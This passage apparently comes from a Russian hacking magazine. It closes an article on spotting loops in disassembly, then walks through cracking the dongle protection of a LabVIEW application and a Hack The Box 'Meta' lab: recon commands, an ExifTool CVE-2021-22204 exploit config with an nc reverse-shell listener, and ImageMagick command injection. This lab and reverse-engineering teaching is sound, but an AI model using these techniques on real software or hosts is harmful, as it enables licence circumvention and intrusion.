for, и оператора GOTO, но GOTO сейчас не в моде и используется крайне ред‐
ко, а без него оператор условного перехода IF — THEN не может прыгнуть
непосредственно в середину цикла while! Выходит, изо всех «кандидатов»
остается только цикл for.
   Некоторые  особо  продвинутые  компиляторы  (Microsoft  Visual  C++,
Embarcadero C++Builder) поступают хитрее: анализируя код, они еще на ста‐
дии компиляции пытаются определить, выполняется ли данный цикл хотя бы
один раз, и, если видят, что он действительно выполняется, превращают for
в типичный цикл с постусловием.





Наконец, самые совершенные компиляторы (из которых можно назвать один
лишь Microsoft Visual C++) могут даже заменять циклы с приращением на цик‐
лы с убыванием при условии, что параметр цикла не используется операто‐
рами цикла, а лишь прокручивает цикл определенное число раз. Зачем
это компилятору? Оказывается, циклы с убыванием гораздо короче — одно‐
байтовая инструкция DEC не только уменьшает операнд, но и выставляет
Zero-флаг при достижении нуля. В результате необходимость в команде CMP
A, xxx отпадает автоматически.





Таким образом, в зависимости от настроек и характера компилятора циклы
for могут транслироваться и в циклы с предусловием, и в циклы с постусло‐
вием, начинающие свое выполнение с проверки условия продолжения цикла.
Причем условие продолжения может инвертироваться в условие завершения,
а возрастающий цикл может волшебным образом превратиться в убы‐
вающий.
   Такая неоднозначность затрудняет идентификацию циклов for. Надежно
определяются лишь  циклы, начинающиеся с  проверки  постусловия, так
как они не могут быть отображены на do без использования GOTO. Во всех
остальных случаях никаких строгих рекомендаций по распознаванию for дать
нельзя.
   Скажем так: если логика исследуемого цикла синтаксически удобнее
выражается через оператор for, то и выражай ее через for! В противном
случае используй while или do (repeat\until) для циклов с пред- и пос‐
тусловием соответственно.
  И в заключение пара слов о «кастрированных» циклах. Язык C/C++ поз‐
воляет опустить инициализацию переменной цикла, условие выхода из него,
оператор приращения переменной или все это вместе. При этом for вырож‐
дается в while и становится практически неотличимым от него.


ЦИКЛЫ С УСЛОВИЕМ В СЕРЕДИНЕ
Популярные языки высокого уровня непосредственно не поддерживают цик‐
лы с условием в середине, хотя необходимость в них возникает довольно
часто. Поэтому программисты их реализуют на основе уже имеющихся цик‐
лов while (while\do) и оператора выхода из цикла break. Например, так.





Компилятор (если он не совсем осёл) разворачивает бесконечный цикл
в безусловный переход JMP, направленный, естественно, назад (ослы генери‐
руют код вроде MOV EAX, 1\CMP EAX,1\JZ repeat). Направленный назад
безусловный переход весьма характерен — за исключением бесконечного
цикла, его может порождать один лишь оператор GOTO. А раз у нас есть бес‐
конечный цикл, то условие его завершения может находиться лишь в середи‐
не этого цикла (сложные случаи многопоточных защит, модифицирующих
из соседнего потока безусловный переход в NOP, мы пока не рассматрива‐
ем). Остается прочесать тело цикла и найти это самое условие.
   Сделать это будет нетрудно — оператор break транслируется в переход
на первую команду, следующую за JMP  repeat, а сам break получает
управление от ветки IF (условие) — THEN — [ELSE]. Условие ее срабаты‐
вания и будет искомым условием завершения цикла. Вот, собственно, и все.


ЦИКЛЫ С МНОЖЕСТВЕННЫМИ УСЛОВИЯМИ ВЫХОДА
Оператор break позволяет организовать выход из цикла в любом удобном
для программиста месте, поэтому любой цикл может иметь множество усло‐
вий выхода, беспорядочно разбросанных по его телу. Это ощутимо усложняет
анализ дизассемблируемой программы, так как возникает риск «прозевать»
одно из условий завершения цикла, что приведет к неправильному понима‐
нию логики программы.
   Идентифицировать условия выхода из цикла очень просто — они всегда
направлены  «вниз», то есть в область  старших  адресов, и  указывают
на команду, непосредственно следующую за инструкцией условного (безус‐
ловного) перехода, направленного «вверх», в область младших адресов.


ЦИКЛЫ С НЕСКОЛЬКИМИ СЧЕТЧИКАМИ
Оператор «запятая» языка С/C++ позволяет выполнять множественную ини‐
циализацию и модификацию счетчиков цикла for. Например: for (int a =
0, b = 10; a != b; a++, b--)... А как насчет нескольких условий завер‐
шения? Подавляющее большинство учебников по программированию на этот
счет хранят гробовое молчание.
  С помощью Embarcadero C++Builder 10.4 попробуем скомпилировать сле‐
дующий код (пример some_counters_cb):


int _tmain(int argc, _TCHAR* argv[]) {
  for (int a = 0, b = 10; a < 10, b > 5; a++, b--)
    std::cout << a << " | " << b << std::endl;


  return 0;
}

Он будет благополучно «проглочен» компилятором, однако в области предуп‐
реждений выведет



  cod1.cpp(15,27): warning W7379: relational comparison result unused





                Результат выполнения примера some_counters_cb

Предупреждение он вывел, а скомпилировал‑то все равно неправильно!
Логическое условие (a  , a  , a  ,  ...  ,a ) лишено смысла, и компиляторы                        1   2   3       n
без малейших колебаний и зазрений совести отбросят все, кроме самого
правого выражения a  . Оно‑то и будет единолично определять условие про‐                      n
должения цикла.
   Откомпилируем этот же код в Microsoft Visual C++ 2022. Он выведет более
осмысленное сообщение: «Предупреждение C6319: Использование операто‐
ра „запятая“ в проверяемом выражении приводит к тому, что левый аргумент
будет пропущен, если у него нет побочных эффектов».
   Такое объяснение более  понятно. Если условие продолжения  цикла
зависит от нескольких переменных, то их сравнения следует объединить
в одно выражение посредством логических операций OR, AND и других. Нап‐
ример: for (a=0, b=10; (a > 0 && b < 10); a++, b--) — цикл прерыва‐
ется сразу же, как только одно из двух условий станет ложно; for (a=0,
b=10; (a > 0 || b < 10); a++, b--) — цикл продолжается до тех пор,
пока истинно хотя бы одно условие из двух.
  Для успокоения совести модифицируем код нашего примера, ском‐
пилируем его и посмотрим на результат:


int main() {
  for (int a = 0, b = 10; (a < 10 || b > 5); a++, b--)
    std::cout << a << " | " << b << std::endl;
}





                  Результат выполнения примера some_counters

В остальном же циклы с несколькими счетчиками транслируются аналогично
циклам с одним счетчиком, за исключением того, что инициализируется
и модифицируется не одна, а сразу несколько переменных.


ИДЕНТИФИКАЦИЯ CONTINUE
Оператор continue приводит к непосредственной передаче управления
на код проверки условия продолжения (завершения) цикла. В общем случае
он транслируется в безусловный jump в циклах с предусловием, направлен‐
ным вверх, а в циклах с постусловием — вниз. Следующий за continue код
уже не получает управления, поэтому continue практически всегда исполь‐
зуется в условных конструкциях.
   Например:


while (a++ < 10)
  if (a == 2)
    continue;
...

Компилируется приблизительно так.





СЛОЖНЫЕ УСЛОВИЯ
До сих пор, говоря об условиях завершения и продолжения цикла, мы рас‐
сматривали лишь элементарные условия отношения, в то время как прак‐
тически все языки высокого уровня допускают использование составных
условий. Однако составные условия можно схематично изобразить в виде
абстрактного «черного ящика» с входом/выходом и логическим двоичным
деревом внутри. Построение и реконструкция логических деревьев подробно
рассматриваются в разделе «Идентификация IF — THEN — ELSE», здесь же
нас интересует организация циклов, а не сами условия.


Вложенные циклы
Циклы, понятное дело, могут быть и вложенными. Казалось бы, какие проб‐
лемы? Начало каждого цикла надежно определяется по перекрестной ссыл‐
ке, направленной вниз. Конец цикла — условный или безусловный переход
на его начало. У каждого цикла только одно начало и только один конец (хотя
условий выхода может быть сколько угодно, но это другое дело). Причем цик‐
лы не могут пересекаться; если между началом и концом одного цикла встре‐
чается начало другого цикла, то этот цикл — вложенный.
  Но не все так просто: тут есть два подводных камня. Первый: оператор
continue в циклах с предусловием, второй — сложные условия продолжения
цикла с постусловием. Рассмотрим их подробнее.
   Поскольку в циклах с предусловием оператор continue транслируется
в безусловный переход, направленный «вверх», он становится практически
неотличим от конца цикла. Смотри:


while (условие1) {
  ...
  if (условие2) continue;
  ...
}

Транслируется в следующий код.





Два конца и два начала вполне напоминают два цикла, один из которых вло‐
жен в другой. Правда, начала обоих циклов совмещены, но ведь может же
такое быть, если в цикл с постусловием вложен цикл с предусловием?
На первый взгляд кажется, что да, но если подумать, то... ай‑ай‑ай! А ведь ус‐
ловие1 выхода из цикла прыгает аж за второй конец! Если это предусловие
вложенного цикла, то оно прыгало бы за первый конец. А если условие1 —
предусловие материнского цикла, то конец вложенного цикла не смог бы
передать на него управление. Выходит, это не два цикла, а один. А первый
«конец» — результат трансляции оператора continue.
  С разбором сложных условий продолжения цикла с постусловием дела
обстоят еще лучше. Рассмотрим такой пример:


do {
  ...
} while(условие1 || условие2);

Ну чем не


do {
  do {
    ...
  } while(условие1)
} while(условие2)

Строго говоря, предложенный вариант логически верен, но синтаксически
некрасив. Материнский цикл крутит в своем теле один лишь вложенный цикл
и не содержит никаких других операторов. Так зачем он тогда, спрашивается,
нужен? Следует объединить его с вложенным циклом!


ЗАКЛЮЧЕНИЕ
По большому счету это была теоретическая статья. В ней мы не рассмотрели
ни одного дизассемблерного листинга. Однако и цель у нее другая: показать
все  разнообразие  циклов и  подготовить тебя  к  следующему шагу —
к осмысленному разбору дизассемблерных листингов настоящих программ
с возможностью отмечать корректные и неправильные ходы конкретного ком‐
пилятора. Поэтому будь готов в следующей статье к новым путешествиям
по непроходимым дизассемблерным зарослям.


        WWW

                  Юрий Язев призывает тебя пообщаться с ним
                      и другими читателями на тему дизассемблирова‐
                       ния и «Фундаментальных основ» в дискорде.
ВЗЛОМ
      ПОЛНОЕ
  G

     ЛОМАЕМ ПРИЛОЖЕНИЕ НА ЯЗЫКЕ G,
               СОЗДАННОЕ В LABVIEW





                                                                МВК





Существуют весьма экзотичные языки программирования.
Один из них — язык G, для которого компания National
Instruments создала специальную среду разработки под наз‐
ванием LabVIEW. Тема реверса такого софта практически
не раскрыта из‑за узкой специализации подобных прог‐
рамм. Это упущение, я надеюсь, поможет исправить сегод‐
няшняя статья.


Воистину  безгранична фантазия  маркетологов, проектирующих  продукты
для ленивых людей. Еще на заре эры  визуального  программирования
в какую‑то светлую голову пришла идея, что нубу, который не может осилить
синтаксис самого простецкого языка программирования высокого уровня,
будет проще рисовать программу в виде блок‑схемы, как в школе. Несос‐
тоятельность подобного предположения очевидна: если у пациента напрочь
отсутствует структурное логическое мышление, то он и блок‑схему не сможет
правильно нарисовать. А если такой навык имеется, то освоить несложный
синтаксис для него совершенно не проблема, зато писать текстовый код
гораздо сподручнее, чем громоздить друг на друга тысячи блоков в визуаль‐
ном редакторе.
  Но маркетинг — сильная вещь, и данная технология не то чтобы слишком
глубоко, но все же укоренилась на рынке и отвоевала себе определенный
сегмент: появились Smalltalk и ему подобные. В современности очередным
чудовищным порождением данного подхода стал графический язык прог‐
раммирования G фирмы National Instruments. Для его поддержки была соз‐
дана монструозная среда разработки и платформа для выполнения прог‐
рамм LabVIEW (англ. Laboratory Virtual Instrumentation Engineering Workbench),
в которой можно даже создавать визуальные standalone исполняемые при‐
ложения.
   Основная аудитория этой среды разработки — технари, знающие железо,
но не особо сведущие в его программировании, которые, поддавшись рек‐
ламе,   надеются   по‑быстрому   нарисовать  на   коленке  интерфейс
к какому‑нибудь китайскому датчику или роботу из лего. По счастью, чуток
набравшись опыта, они или сами переходят на нормальные языки прог‐
раммирования,  или  находят  специально  обученных  людей,  способных
написать программу за  них. Либо  просто бросают это  неблагодарное
занятие, ужаснувшись неудобству среды разработки.
   Именно поэтому мы практически не встречаем среди распространенных
коммерческих пакетов данные порождения тьмы, терзающие взор здорового
человека неестественным видом интерфейса, диалоговых окон и контролов.
Тем не менее они все‑таки попадаются среди узкоспециальных утилит под‐
держки экзотичного железа, и их даже защищают от копирования. Встреча
с подобной защитой — адский кошмар для хакера даже не потому, что
защита хорошо продумана технически. Просто, как ты скоро убедишься,
архитектура подобных приложений закрыта и неудобна в отладке.
   Итак, рассмотрим пример конкретного приложения. Обычно это система
управления техническими процессами, в нашем случае — интерфейс нас‐
тройки специфического железа, защищенный серьезным аппаратным клю‐
чом, при  отсутствии  которого программа  выдает  довольно необычное
с дизайнерской точки зрения сообщение об ошибке и работает с урезанной
функциональностью. Как именно мы определили, что перед нами — порож‐
дение LabVIEW? Это вовсе не очевидно, ни DIE, ни Exeinfo (и, насколько мне
известно, остальные детекторы) этот формат не определяют.
  Из специфики строения подобных приложений можно отметить разве что
крохотный кусок исполняемого кода без какого‑то специфического импорта
с прицепленным к нему огромным запакованным и зашифрованным овер‐
леем, занимающим свыше 99% общего объема файла. В коде загрузчика
можно найти текстовые строки LabVIEW, National  Instruments и LVRT.
Правда, их наличие вовсе не гарантировано. Другой подсказкой о про‐
исхождении программы может стать упомянутый вырвиглазный дизайн эле‐
ментов управления.





             Пример интерфейса, скриншот из документации

Мы потихоньку подошли к загрузке программы в отладчик, в качестве которо‐
го будет использоваться наш любимый x64dbg. К счастью, программа бла‐
гополучно туда загружается и запускается. Толку, правда, от этого немного:
ни строк, ни малейших  участков, похожих на все виды известного нам
исполняемого кода, не появляется даже в дампе. Все действие программы
в основном крутится внутри модуля LVRT.DLL, наличие которого, пожалуй,
и является отличительной особенностью исполняемых приложений, соз‐
данных в этой среде разработки.
   Этот библиотечный модуль представляет собой ядро виртуальной машины
(если ее можно так назвать), имеет множество экспортируемых функций, но,
к сожалению, совершенно не документированных. Мы еще вернемся к дан‐
ному модулю, а пока попробуем зайти с другой стороны.
  При первичном осмотре приложения мы уже заметили, что основной его
объем занимает шифрованный оверлей с практически нулевой энтропией.
Справедливо полагая, что весь код и данные приложения сосредоточены
именно в нем, приступим к его исследованию. Открыв программу в любом
редакторе ресурсов или обычном архиваторе, обращаем внимание на наибо‐
лее увесистую часть оверлея.





                           Модуль в архиваторе

Извлечем ресурс 2 в отдельный файл и рассмотрим его более пристально.
Сразу бросается в глаза сигнатура RSRC, которая наталкивает на мысль
о формате resource fork Mac OS. Собственно, сами разработчики и говорят
о том, что взяли за основу данный формат, поскольку LabVIEW изначально
создавался для этой платформы, а позже, в версии 2.5, был перенесен
на другие ОС.





                          Ресурс 2 в hex-редакторе

Это уже какая‑то отправная точка. Немного погуглив, мы обнаруживаем, что
до нас исследования в этом направлении уже проводились и упомянутый
формат частично реверсирован. Рассматриваемый нами заголовок выглядит
вот так:


 Length     Type     Value

 6               string      "RSRC\r\n"

 2                     ?

 4               string       "LVIN" (LabVIEW Instrument?)

 4               string     "LBVW" (LabVIEW?)

 4              uint32    RSRC Info Offset

 4              uint32    RSRC Info Size

 4              uint32    RSRC Data Offset

 4              uint32    RSRC Data Size

Вторая хорошая новость — нам вовсе не обязательно писать свой парсер,
поскольку добрый человек под ником mefistotelis уже сделал все за нас,
запилив инструмент pylabview, который умеет очень многое. Для его исполь‐
зования потребуется Python, после установки которого мы сможем преобра‐
зовать богомерзкий шифрованный ресурс в обычный ZIP-архив при помощи
такой команды:


readRSRC.py -x -i 2

Распаковав получившийся архив 2_LVzp.bin, мы увидим множество вложен‐
ных каталогов с файлами .VI (Visual Instrument), .CTL (элементы управления)
и другими.
  По сути, эти файлы — составные части проекта LabVIEW. Если загрузить их
в эту среду разработки, теоретически можно пересобрать проект заново.
Такая возможность существует и в самом pylabview, что, конечно, радует,
но нашу радость портит один маленький нюанс. Вся наша работа, по сути,
проделана зря, ибо файлы VI — уже откомпилированные файлы программно‐
го байт‑кода, а исходные блок‑схемы безвозвратно утрачены. Максимум,
на что мы можем рассчитывать, загрузив все эти файлы в LabVIEW, —
это строковые значения, имена классов и методов, их иерархию ссылок
и расположение контролов на панели. Что абсолютно не приближает нас
к реверсу кода и пониманию логики функционирования программы.
   Немного поможет нам в этом pylabview. Поскольку файл VI тоже RSRC-
ресурс, можно и его разложить по расшифрованным‑распакованным блокам
при помощи следующей команды:


readRSRC.py -vv -x -i myVI.vi

Сразу предупреждаю, что pylabview вовсе не универсальный инструмент
для всех актуальных версий LabVIEW, поэтому при выполнении последней
операции могут возникнуть ошибки, связанные с версиями файлов. У меня
лично получилось побороть эту проблему тупым комментированием строк
модуля LVblock.py:


 if version_unk_len != 0:
    raise AttributeError("Block {} section {} always zero value 1
is {} instead of {}" \
     .format(self.ident,section_num,version_unk_len,0))

На выходе мы получаем набор расшифрованных и распакованных (обычно
используется компрессия  zlib) блоков, составляющих файл VI, и краткую
информацию о нем в виде XML-файла. Попутно мы получим секции *.bin,
содержащие откомпилированный платформенно зависимый код (наконец‑то
мы до него добрались) и даже его карту по относительным адресам сле‐
дующего вида:


Address         Publics by Value  0001:00000E00
_Z17_InitCodePtrsProcPP13VICodePtrsRec
0001:0000002C   codeBlob

К сожалению, это снова мало что нам дает в плане анализа: все привязки
внутри кода к строкам и реальным адресам выполняются при загрузке VI
в память, поэтому понять что‑либо в таком непривязанном коде просто нере‐
ально. Но мы попытаемся. Внимательно посмотрев на секции кода от разных
VI, обращаем внимание, что после блока данных в заголовке код обязатель‐
но начинается с конструкции подобного вида:


00000380: 53                push  ebx
00000381: 57                push  edi
00000382: 56                push  esi
00000383: 83EC28            sub   esp,028
00000386: 8B442440          mov   eax,[esp][040]
0000038A: 48                dec   eax
0000038B: 8B7C2438          mov   edi,[esp][038]
0000038F: 83F81C            cmp   eax,01C
00000392: 7629              jbe   0000003BD --↓1
00000394: 8B476C            mov   eax,[edi][06C]
00000397: C7403C00000000    mov   d,[eax][03C],0
0000039E: 8B07              mov   eax,[edi]
000003A0: 893C24            mov   [esp],edi
000003A3: C744240800000000  mov   d,[esp][8],0
000003AB: C744240409000000  mov   d,[esp][4],9
000003B3: FF5068            call  d,[eax][068]
000003B6: 83C428            add   esp,028
000003B9: 5E                pop   esi
000003BA: 5F                pop   edi
000003BB: 5B                pop   ebx
000003BC: C3                retn
000003BD: 8B4C243C          1mov  ecx,[esp][03C]
000003C1: FF248500000000    jmp   d,[eax]*4[0]

Мы видим процедуру с тремя параметрами. Первый из них — индекс в таб‐
лице адресов, по которым выполняется переход в конце. Общее количество
адресов разное в зависимости от секции, в данном случае 28. На самом деле
каждый фрагмент кода, на который указывает адрес перехода, — так называ‐
емый повторяющийся блок (RepeatedBlock). Это линейный на диаграмме
фрагмент кода. Эти блоки следуют друг за другом, переключение между ними
осуществляется внутри  блока. Попробуем понять, каким образом блоки
вызываются из виртуальной машины LB.
  Для этого откроем нашу программу в x64dbg и проследим за ней до того
момента, где нужный нам VI, по идее, должен быть загружен, после чего
поищем этот код глобально по памяти процесса. Мы видим, что код действи‐
тельно загружен, причем ссылки на перемещаемые адреса уже привязаны.
Ставим точку останова на его вход. Как только точка останова срабатывает,
по адресу возврата мы легко и непринужденно выходим на интерпретатор
этих самых RepeatedBlocks. Разумеется, он находится внутри модуля LVRT,
и его основной цикл выглядит чертовски просто:


7BEC3F37 | 8B7E 10       | mov edi,dword ptr ds:[esi+10]
7BEC3F3A | 8BCB          | mov ecx,ebx
7BEC3F3C | 8B46 10       | mov eax,dword ptr ds:[esi+10]
7BEC3F3F | 81E3 FFFFFF00 | and ebx,FFFFFF
; Старший байт индекса — номер секции
7BEC3F45 | C1F9 18       | sar ecx,18
; Индекс вызываемого RepeatedBlock
7BEC3F48 | 53            | push ebx
7BEC3F49 | 57            | push edi
7BEC3F4A | 8B50 14       | mov edx,dword ptr ds:[eax+14]
; Указатель на блок следующего VI
7BEC3F4D | 52            | push edx
7BEC3F4E | 8B02          | mov eax,dword ptr ds:[edx]
; Таблица адресов обработчиков секций
7BEC3F50 | 8B4488 78     | mov eax,dword ptr ds:[eax+ecx*4+78]
7BEC3F54 | FFD0          | call eax
; Возвращается индекс следующего исполняемого RepeatedBlock
7BEC3F56 | 8BD8          | mov ebx,eax
7BEC3F58 | 83C4 0C       | add esp,C
; Если значение отрицательное, требуется выполнить некие действия
; Чаще всего — подгрузить следующий VI или перерисовать интерфейс
7BEC3F5B | 85DB          | test ebx,ebx
; На начало
7BEC3F5D | 7F D8         | jg lvrt.7BEC3F37

Теперь у нас есть за что зацепиться! Установив точку останова на вызов
обработчика RepeatedBlock и поставив в ней текст журнала call  {eax}
index {[esp+8]}, мы получим лог последовательности вызовов повторя‐
ющихся блоков следующего вида:



  ...
  call to DFB3C00 method 2
  call to DFB3C00 method 1
  call to DFB3C00 method F
  call to 123D6110 method 1
  call to 120B2B10 method 1
  call to 123D6110 method B
  call to 11619130 method 1
  call to 11550F80 method 1
  call to 11619130 method B
  call to 123D6110 method D
  call to DFB3C00 method 11
  Поток 297C завершен
  Поток 3464 завершен
  call to DFC3070 method 0
  call to DFB3C00 method 15
  call to DFB3C00 method 19
  call to 17E19630 method 1
  call to 17E19630 method 11
  call to 17E48F40 method 1
  call to 17E19630 method 13
  call to DFCF210 method 0
  call to 17CC19C0 method 1
  call to 123D6110 method 1
  call to 120B2B10 method 1
  call to 123D6110 method B
  call to 11619130 method 1
  call to 11550F80 method 1
  call to 11619130 method B
  call to 123D6110 method D
  call to 17CC19C0 method D
  ...


Слева — адреса обработчика текущей секции, справа — индекс текущего
повторяющегося блока. Как видим, код, по сути, одномерный, хоть и нелиней‐
ный. То есть вложенность наверняка  присутствует на внешнем  уровне,
но реализована она без рекурсии, указатель стека (насколько я могу судить)
всегда остается на месте. Таким образом, мы получили хоть и ужасно неудоб‐
ный, но все же инструмент анализа, отслеживающий ветвления. Сравнив две
трассы,  с  ключом и  без, мы можем  найти  развилку  в  коде —  VI
и RepeatedBlock внутри него, переключивший исполнение программы на дру‐
гую ветку.
   Дальше все довольно сурово: внутри RepeatedBlock логика безумно слож‐
на. Как я уже говорил, библиотека LVRT.dll имеет множество выходов
экспортируемых   функций,   большинство  из  которых   крайне   трудны
для понимания. Но попадаются среди них простые и понятные. Остановимся
на паре из них.
   LabVIEW позволяет пользователю вызывать функции API и сторонние
динамические библиотеки. Установив точку останова на внешнюю API-шную
функцию, легко убедиться, что она всегда вызывается из кода RepeatedBlock
через хитрый шлюз посредством функции ExtFuncWrapper. Установка точек
останова на которые сильно облегчит отслеживание системных API-шных
вызовов из программы. Другая проблема с текстовыми строками — хоть они
и не зашифрованы на момент исполнения программы, но на них напрочь
отсутствуют прямые ссылки из кода.
   Тут нам поможет другая функция: CopyLStr, через которую RepeatedBlock
получает доступ к любой загруженной на данный момент строковой констан‐
те. Оба параметра данной функции — двойные указатели на строку со счет‐
чиком (счетчик внезапно 32-битный). Первый параметр — источник, вто‐
рой — получатель. Подобные маленькие хитрости помогают постичь логику
работы программы и отыскать патч, а это весьма нелегко.
  В нашем случае достаточно поменять один байт внутри RepeatedBlock.
В иной ситуации мы просто бы взяли Hiew или любой другой шестнадцатерич‐
ный редактор и поменяли бы нужное значение в нем, однако, я надеюсь, ты
помнишь, с каким трудом мы извлекли открытый код из скомпилированного .
EXE? Мы в большой беде, ибо код как минимум дважды зашифрован
и запакован.
   Можно попробовать пойти тем же путем: при помощи pylabview собрать VI
из бинарных модулей и XML, потом добавить его в архив 2_LVzp.bin,
который тем же pylabview сконвертировать в ресурс RSRC, а уже его редак‐
тором ресурсов превратить в EXE. В теории выглядит просто, однако сразу
предупреждаю, что на практике этот путь тернист и трудно преодолим.
К сожалению, как я уже говорил, pylabview все‑таки  достаточно сырой
и неуниверсальный инструмент. К тому же параноидальные разработчики
из конторы National Instruments снабдили свой формат таким количеством
цифровых подписей, контрольных сумм и хешей, меняющихся от версии
к версии, что можно намертво встрять уже на первом этапе компоновки VI-
файла из составных блоков (как это было у меня).
   Конечно, если ты большой любитель питона и хочешь помочь человечес‐
тву, то можешь допилить функциональность pylabview под свою версию, благо
этот проект свободный и исходники открыты. Но лично мне все же кажется,
что проще патчить загружаемый код на лету. Принцип такого патча я опи‐
сывал в своих статьях многократно, поэтому напомню лишь общий принцип:
мы внедряем свой код в основной цикл интерпретатора. Код проверяет,
нужен ли загружаемому RepeatedBlock патч, и выполняет его (права доступа
в данном случае позволяют это делать). Но этот метод, конечно, на любителя.
Возможно, читатель придумает какой‑то свой, более прямой и оригинальный
способ патча столь необычной среды, как LabVIEW.
ВЗЛОМ

      HTB
 META





     ЭКСПЛУАТИРУЕМ УЯЗВИМОСТИ
    В ОБРАБОТЧИКАХ ИЗОБРАЖЕНИЙ





Когда на сайт можно загрузить картинку,
это повод для поиска уязвимостей. В этой
статье я  расскажу,  как  определять ПО,
которое используется для обработки кар‐
тинок, а затем мы проэксплуатируем най‐            RalfHacker                                                                                             hackerralf8@gmail.com
денные баги. Чтобы повысить привилегии,
воспользуемся     техникой    GTFOBins
для эскалации через neofetch. Упражняться
будем на средней по сложности машине
Meta с площадки Hack The Box.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.140    meta.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$/ /)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Мы нашли всего два открытых порта: 22 — служба OpenSSH 7.9p1 и 80 —
веб‑сервер Apache. Вот только когда мы попытаемся обратиться к сайту, нас
перебросят на другой домен.





                              Новый домен

Меняем запись в файле /etc/hosts и обновляем страницу.


10.10.11.140    meta.htb artcorp.htb





                           Главная страница сайта

На сайте отметим для себя только имена пользователей, иногда это может
пригодиться. К сожалению, никаких точек входа найти не удалось, поэтому
перейдем к сканированию сайта.


Сканирование поддоменов
Так как сайт имеет свой собственный домен, стоит проверить, существуют ли
у него поддомены. Для этого используем сканер ffuf.


Справка: сканирование веба c ffuf
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch и DIRB.
  Я предпочитаю легкий и очень быстрый ffuf. При запуске указываем сле‐
дующие параметры:
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -u — URL;
 • -fc — исключить из результата ответы с кодом 403.



Выполняем следующую команду:


ffuf -u http://artcorp.htb/ -t 256 -H 'Host: FUZZ.artcorp.htb' -w
subdomains-top1million-110000.txt





                       Результат сканирования поддоменов

В выводе получаем почти все слова из списка, так как код ответа всегда 301.
Поэтому стоит задать дополнительную фильтрацию, к примеру из всего спис‐
ка кодов убрать переадресацию (опция -mc).


ffuf -u http://artcorp.htb/ -t 256 -H 'Host: FUZZ.artcorp.htb' -w
subdomains-top1million-110000.txt -mc 200,204,401,403,405,500




                       Результат сканирования поддоменов

В итоге получим новый поддомен, а значит, обновим запись /etc/hosts.


10.10.11.140    meta.htb artcorp.htb dev01.artcorp.htb


ТОЧКА ВХОДА
Переходим по  найденному  адресу и  получаем  простенькую  страничку
со ссылкой на приложение, которое находится в разработке.





                     Главная страница dev01.artcorp.htb

В приложении есть форма загрузки изображений. А это явно точка входа.





                     Форма загрузки изображений

Способы загрузить какую‑то нагрузку сразу исчерпали себя, а вот воз‐
можности самого приложения заставили задуматься. Если отправить кар‐
тинку, нам вернут ее метаданные.





                   Метаданные загруженного приложения

Вывод веб‑приложения очень похож на вывод утилиты ExifTool. Попробуем
поискать эксплоиты для него.


ТОЧКА ОПОРЫ
Для поиска эксплоитов я обычно использую Google. С его помощью я нашел
эксплоит для CVE-2021-22204. В ExifTool версий с 7.44 до 12.24 можно
выполнить произвольный код при разборе изображения из‑за некорректной
обработки пользовательских данных в формате DjVu. Для работы эксплоита
необходимо установить следующие программные пакеты.


sudo apt install djvulibre-bin exiftool

В строках 6 и 7 указываем адрес своего хоста и порт, который будет прос‐
лушиваться листенером (открываем командой rlwrap -cAr nc -lvp 4321).





                        Исходный код эксплоита

В строке 24 вызывается сам ExifTool и ему передается файл с настройками.
Пример  конфига мне  удалось  найти  в  другой  реализации  эксплоита
(параметр Name должен быть как в строке 24 эксплоита).


%Image::ExifTool::UserDefined = (
   'Image::ExifTool::Exif::Main' => {
       0xc51b => {
           Name => 'HasselbladExif',
           Writable => 'string',
           WriteGroup => 'IFD0',
       },
   },
);
1;

Теперь запустим скрипт для генерации вредоносного файла. Если все прой‐
дет удачно, мы должны получить следующее сообщение.





                          Запуск файла репозитория

После загрузки этой картинки моментально получаем реверс‑шелл на свой
листенер.





                                 Бэкконнект


ПРОДВИЖЕНИЕ
Теперь, когда мы получили доступ к хосту, нам надо собрать информацию.
Всяких закоулков в системе много, и, чтобы не держать их все в голове, были
разработаны скрипты PEASS.


Справка: скрипты PEASS для Linux
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате.



Используем скрипт для Linux и, когда он отрабатывает, находим в его резуль‐
татах следующую информацию:
 • в системе установлен ImageMagick;
 • нам доступны для записи два интересных каталога — convert_images
   и uploads.





                 Файлы, вероятно содержащие SSH-ключи





                          Каталоги, доступные для записи

Больше ничего в глаза не бросилось, а что делать с тем, что имеем, непонят‐
но. Тогда попробуем отследить запускаемые в системе процессы. Для этого
будем использовать pspy.





                                   Логи pspy64

Обнаруживаем регулярно запускаемый от имени пользователя (UID=1000)
файл /usr/local/bin/convert_images.sh. Это скрипт на Bash — прос‐
мотрим его содержимое.




                  Содержимое файла convert_images.sh

В скрипте изображения конвертируются из обнаруженного ранее каталога
с помощью утилиты mogrify. Определим, какая версия утилиты используется.


mogrify -version





                       Определение версии mogrify

Так как мы знаем версию продукта, можно поискать готовые эксплоиты.





                         Поиск эксплоитов в Google

Вторая  ссылка  из  Google  указывает  на  уязвимость  CVE-2020-29599.
ImageMagick версии до 6.9.11-40 и с 7.x до 7.0.10-40 неправильно обрабаты‐
вает  параметр  authenticate,  который  позволяет  установить  пароль
для защищенных паролем файлов PDF. Пароль, который устанавливает поль‐
зователь, не обрабатывается должным образом, что открывает возможность
инъекции команды терминала через coders/pdf.c.





                             Детали уязвимости

